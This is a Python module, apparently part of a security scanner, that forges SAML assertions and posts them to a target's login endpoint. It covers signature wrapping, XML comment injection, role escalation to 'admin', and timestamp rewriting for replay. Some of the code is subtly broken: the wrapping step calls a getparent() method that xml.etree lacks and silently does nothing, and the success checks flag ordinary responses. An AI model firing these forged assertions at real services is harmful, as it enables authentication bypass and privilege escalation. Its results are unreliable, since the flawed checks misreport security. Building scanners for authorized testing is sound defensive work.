#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin
import json
import base64
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from RAGScripts.utils.logger import setup_scanner_logger

async def check_saml_vulnerabilities(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        
        # Test cases for SAML abuse
        test_cases = [
            {
                'name': 'Signature wrapping',
                'modification': create_wrapped_assertion
            },
            {
                'name': 'Comment injection',
                'modification': inject_xml_comment
            },
            {
                'name': 'Role escalation',
                'modification': modify_role_attribute
            },
            {
                'name': 'Replay attack',
                'modification': modify_assertion_timestamp
            }
        ]
        
        saml_response = extract_saml_response(initial_response)
        if not saml_response:
            return findings
        
        for test in test_cases:
            try:
                modified_saml = test['modification'](saml_response)
                
                response = requests.post(
                    test_url,
                    data={'SAMLResponse': base64.b64encode(modified_saml.encode()).decode()},
                    headers={'Content-Type': 'application/x-www-form-urlencoded'},
                    timeout=5
                )
                
                if is_saml_vulnerable(response, test):
                    findings.append({
                        "type": "SAML Abuse",
                        "detail": f"Potential {test['name']} vulnerability",
                        "evidence": {
                            "url": test_url,
                            "original_saml": saml_response,
                            "modified_saml": modified_saml,
                            "status_code": response.status_code,
                            "response": response.text[:200]
                        }
                    })
                    
            except requests.exceptions.RequestException:
                continue
                
    except Exception as e:
        print(f"Error in SAML check: {str(e)}")
    
    return findings

def extract_saml_response(response: requests.Response) -> Optional[str]:
    # Check POST data for SAML response
    if hasattr(response.request, 'body'):
        try:
            body = parse_form_data(response.request.body)
            if 'SAMLResponse' in body:
                return base64.b64decode(body['SAMLResponse']).decode()
        except:
            pass
    
    # Check HTML content for SAML data
    try:
        content = response.text
        if 'SAMLResponse' in content:
            start = content.find('value="', content.find('SAMLResponse')) + 7
            end = content.find('"', start)
            if start != -1 and end != -1:
                return base64.b64decode(content[start:end]).decode()
    except:
        pass
    
    return None

def parse_form_data(body: str) -> Dict:
    result = {}
    try:
        pairs = body.split('&')
        for pair in pairs:
            key, value = pair.split('=', 1)
            result[key] = value
    except:
        pass
    return result

def create_wrapped_assertion(saml: str) -> str:
    try:
        root = ET.fromstring(saml)
        assertion = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')
        if assertion is not None:
            # Create wrapper element
            wrapper = ET.Element('{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')
            wrapper.append(assertion)
            # Replace original assertion
            assertion.getparent().replace(assertion, wrapper)
            return ET.tostring(root, encoding='unicode')
    except:
        pass
    return saml

def inject_xml_comment(saml: str) -> str:
    try:
        injection = '--><Assertion><!-- '
        return saml.replace('<Assertion>', f'{injection}<Assertion>')
    except:
        pass
    return saml

def modify_role_attribute(saml: str) -> str:
    try:
        root = ET.fromstring(saml)
        attribute = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Attribute[@Name="role"]')
        if attribute is not None:
            value = attribute.find('{urn:oasis:names:tc:SAML:2.0:assertion}AttributeValue')
            if value is not None:
                value.text = 'admin'
        return ET.tostring(root, encoding='unicode')
    except:
        pass
    return saml

def modify_assertion_timestamp(saml: str) -> str:
    try:
        root = ET.fromstring(saml)
        conditions = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Conditions')
        if conditions is not None:
            now = datetime.utcnow()
            conditions.set('NotBefore', (now - timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ'))
            conditions.set('NotOnOrAfter', (now + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ'))
        return ET.tostring(root, encoding='unicode')
    except:
        pass
    return saml

def is_saml_vulnerable(response: requests.Response, test: Dict) -> bool:
    try:
        response_json = response.json()
    except json.JSONDecodeError:
        response_json = {}
    
    response_text = json.dumps(response_json).lower()
    
    # Check for successful authentication/authorization
    if response.status_code == 200:
        success_indicators = [
            'authenticated',
            'authorized',
            'success',
            'welcome',
            'dashboard',
            'profile',
            'admin'
        ]
        if any(indicator in response_text for indicator in success_indicators):
            return True
    
    # Check for specific vulnerabilities
    if test['name'] == 'Signature wrapping':
        if response.status_code < 400 and 'invalid signature' not in response_text:
            return True
    
    if test['name'] == 'Comment injection':
        if response.status_code < 400 and 'xml' not in response_text.lower():
            return True
    
    if test['name'] == 'Role escalation':
        if response.status_code < 400 and 'admin' in response_text:
            return True
    
    if test['name'] == 'Replay attack':
        if response.status_code < 400 and 'expired' not in response_text:
            return True
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_saml_vulnerabilities(
            "http://localhost:5000",
            "/saml/acs",
            "POST",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())